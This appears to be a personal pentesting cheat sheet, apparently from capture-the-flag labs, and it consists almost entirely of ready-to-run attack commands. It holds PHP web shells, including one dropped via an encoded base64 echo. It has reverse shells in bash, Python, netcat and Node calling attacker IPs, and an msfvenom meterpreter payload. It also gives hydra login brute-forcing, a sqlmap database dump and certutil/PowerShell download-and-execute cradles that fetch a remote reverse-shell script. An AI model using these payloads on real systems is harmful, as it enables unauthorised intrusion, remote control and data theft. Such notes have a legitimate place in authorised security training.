# Tips and Tricks

Just various bits of script and techniques I've found useful.

## Web shells

PHP one liner:

`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`

PHP interactive shell:

```
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
<script>document.getElementById("cmd").focus();</script>
```

shell above emitted to a file via base64:

```
echo %50%47%5a%76%63%6d%30%67%62%57%56%30%61%47%39%6b%50%53%4a%48%52%56%51%69%49%47%35%68%62%57%55%39%49%6a%77%2f%63%47%68%77%49%47%56%6a%61%47%38%67%59%6d%46%7a%5a%57%35%68%62%57%55%6f%4a%46%39%54%52%56%4a%57%52%56%4a%62%4a%31%42%49%55%46%39%54%52%55%78%47%4a%31%30%70%4f%79%41%2f%50%69%49%2b%43%6a%78%70%62%6e%42%31%64%43%42%30%65%58%42%6c%50%53%4a%55%52%56%68%55%49%69%42%75%59%57%31%6c%50%53%4a%6a%62%57%51%69%49%47%6c%6b%50%53%4a%6a%62%57%51%69%49%48%4e%70%65%6d%55%39%49%6a%67%77%49%6a%34%4b%50%47%6c%75%63%48%56%30%49%48%52%35%63%47%55%39%49%6c%4e%56%51%6b%31%4a%56%43%49%67%64%6d%46%73%64%57%55%39%49%6b%56%34%5a%57%4e%31%64%47%55%69%50%67%6f%38%4c%32%5a%76%63%6d%30%2b%43%6a%78%77%63%6d%55%2b%43%6a%77%2f%63%47%68%77%43%69%41%67%49%43%42%70%5a%69%68%70%63%33%4e%6c%64%43%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4b%51%6f%67%49%43%41%67%65%77%6f%67%49%43%41%67%49%43%41%67%49%48%4e%35%63%33%52%6c%62%53%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4f%77%6f%67%49%43%41%67%66%51%6f%2f%50%67%6f%38%4c%33%42%79%5a%54%34%4b%50%48%4e%6a%63%6d%6c%77%64%44%35%6b%62%32%4e%31%62%57%56%75%64%43%35%6e%5a%58%52%46%62%47%56%74%5a%57%35%30%51%6e%6c%4a%5a%43%67%69%59%32%31%6b%49%69%6b%75%5a%6d%39%6a%64%58%4d%6f%4b%54%73%38%4c%33%4e%6a%63%6d%6c%77%64%44%34%3d | base64 -d > shell.php
```

## Reverse shells

Bash (almost never works in my experience):

`bash -i >& /dev/tcp/10.10.194.3/4444 0>&1`

Python (almost always works in my experience):

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.194.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

Netcat when you dont have the -e option (this actually worked once when the others didnt!):

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.19.140 4444 >/tmp/f`

Node reverse shell, if you can get this included on a nodejs server:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "10.10.227.15", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

## shell tricks

making a bad reverse shell better:

`python -c 'import pty; pty.spawn("/bin/bash")'`

bypassing url encoding if doing something sneaky like get[cmd]:

`echo urlencoded | base64 -d > shell.php`

creating a windows exe that will call home:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.100.16 LPORT=4443 -f exe -o callhome.exe`

## Brute forcing with hydra

`hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.php:username=^USER^&password=^PASS^&login=login:Login failed"`

The below targets an aspx page, that needed viewstate to go with it in order to get the error message back:

`hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.aspx:__VIEWSTATE=pIru3H%2F3LYg1qp3lNSwHX1ALuENNV6tddZ32Zp4xRIs57ec4jlYH9sp8EHtZ0sp66EsCaToBXZLEbw62lNBT7XuKpv84ZHetBU3stATD5DYczl9JagBTENtoK%2B6lyNFyDsrRWb34%2F9jXclG%2FsQWa1tJXjQAYZJP2MJNhNaH2WMIL%2FQf9&__EVENTVALIDATION=lQWGlUQ0Fmhz%2BuiWoqOKaexWGfGTltskH%2FV3RsXfmd%2B8N5m8JCLGWXUm7pFZQj0G0QjJMd3MLudMx0zUAlot%2BanlZVtlggDnm3e%2B2DNiDwnhrETOWRZdwtNypSULvwzs8ZlD1SiHFFPASQz1PJN12l5Fi3uL4UCohXb%2BBjCo1nU5Sz7I&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"`

## use sqlmap to exploit a blind sql vector (knowing which param and vector to use)

Raw sqlmap will go through all its tests, which might take ages. If you know the test to use, then you can actually specify it in the sqlmap command.

`sqlmap -u "http://10.10.69.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --test-filter="MySQL >= 5.0 error-based - Parameter replace (FLOOR)" --random-agent --dump -p list[fullordering]`

In the above, exploiting https://www.exploit-db.com/exploits/42033, I know the param and the test that will work, so I specify both and jump straight to the dumping.

## downloading files from the windows command prompt

without the use of powershell or anything clever. great for pulling files off my attacker machine

```
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/callhome.exe" callhome.exe
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/callhome2.exe" callhome2.exe
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/winPEAS.bat" winPEAS.bat
```

with powershell (first also invokes a script, in this case Invoke-PowerShellTcp from Nishang):

`println "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.100.16:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.100.16 -Port 4444".execute().text`

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.139.149:8000/callhome.exe','callhome.exe')"`

or more simply, in powershell:

`Invoke-WebRequest -Uri $url -OutFile $output`

## cracking zips

apart from zip2john and john, there is also `fcrackzip -b --method 2 -D -p rockyou.txt -v extracted.zip`